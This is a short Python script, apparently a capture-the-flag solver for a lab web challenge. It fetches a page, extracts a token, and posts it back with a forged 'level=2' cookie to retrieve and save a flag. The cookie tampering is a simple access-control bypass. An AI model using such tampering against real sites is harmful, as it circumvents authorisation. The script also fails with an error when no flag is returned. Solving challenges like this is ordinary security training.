import re
import requests

def exploit_step1(d):
    s = requests.Session()
    resp = s.get(d, params={"step": "1"})
    resp_code = resp.status_code
    if resp_code != 200:
        print("请求异常，异常代码：", resp_code)
        return None
    html = resp.text
    # print("页面内容预览(前300)：")
    re_html = html.replace(">", ">\n")
    # print(re_html[:300])
    re_m = re.search(r'token: ([a-z0-9_]+)', re_html)
    if not re_m:
        print("没有查询到相关数据！")
        return None
    else:
        token = re_m.group(1)
        print("获取到token：", token)
    headers = {"User-Agent": "CTF-Agent"}
    cookies = {"level": "2"}
    data = {"token": token}
    re_post = s.post(d, params={"step": "2"}, data=data, headers=headers, cookies=cookies)
    flag = re.findall(r"flag{.+?}", re_post.text)
    if flag:
        print("获取到flag：")
        with open("re_flag.txt", 'w', encoding='utf-8') as f:
            f.write(flag[0])
    else:
        print("未获取到flag")
    return flag[0]
url = "http://ctflab.iytzx.com/Mini_Challenge.php"
print(exploit_step1(url))
